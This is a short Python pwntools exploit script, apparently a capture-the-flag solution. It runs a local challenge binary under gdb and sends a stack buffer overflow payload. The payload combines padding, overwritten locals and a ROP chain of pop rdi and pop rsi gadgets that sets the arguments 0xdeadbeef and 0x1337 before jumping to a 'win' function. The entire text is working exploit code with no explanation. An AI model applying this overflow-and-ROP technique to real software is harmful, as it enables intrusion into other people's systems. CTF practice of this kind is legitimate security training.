from pwn import *

p = gdb.debug('./chall', gdbscript = 'b *vuln+56')

padding = b'A' * 40

values_set = b'\xf4\x01' + b'\x00'*2 + b'\x90\x01' + b'\x00'*4

adr_win = p64(0x400757)

pop_rdi = p64(0x0000000000400933)

deadbeef = p64(0xdeadbeef)

pop_rsi = p64(0x0000000000400931)

val2 = p64(0x1337)

p.recv()

payload = padding + values_set + b'A'*6 + pop_rdi + deadbeef + pop_rsi + val2 + p64(0x1) + adr_win

p.sendline(payload)

p.interactive()
